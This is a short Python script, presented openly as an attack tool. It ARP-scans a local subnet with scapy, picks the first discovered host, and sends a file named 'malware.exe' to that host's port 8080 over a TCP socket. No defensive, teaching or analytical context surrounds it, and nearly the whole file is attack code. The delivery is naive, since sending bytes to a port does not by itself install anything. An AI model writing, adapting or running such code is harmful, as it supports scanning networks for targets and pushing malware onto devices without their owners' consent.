import socket
import scapy.all as scapy

def scan_ip(ip_range):
    # Create an ARP request packet
    arp_request = scapy.ARP(pdst=ip_range)
    
    # Create an Ethernet frame
    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    
    # Combine the ARP request and Ethernet frame
    packet = ether/arp_request
    
    # Send the packet and receive the response
    result = scapy.srp(packet, timeout=3, verbose=0)[0]
    
    # Extract the IP and MAC addresses from the response
    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})
    
    return devices

def send_malware(ip_address, malware_path):
    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Connect to the target system
    s.connect((ip_address, 8080))
    
    # Send the malware file
    with open(malware_path, 'rb') as f:
        malware_data = f.read()
        s.sendall(malware_data)
    
    # Close the connection
    s.close()

def main():
    # IP range to scan
    ip_range = '192.168.1.1/24'
    
    # Scan the IP range
    devices = scan_ip(ip_range)
    
    # Print the discovered devices
    for device in devices:
        print(f'IP Address: {device["ip"]}, MAC Address: {device["mac"]}')
    
    # Target the first discovered device
    target_ip = devices[0]['ip']
    malware_path = 'malware.exe'
    
    # Send the malware to the target system
    send_malware(target_ip, malware_path)

if __name__ == '__main__':
    main()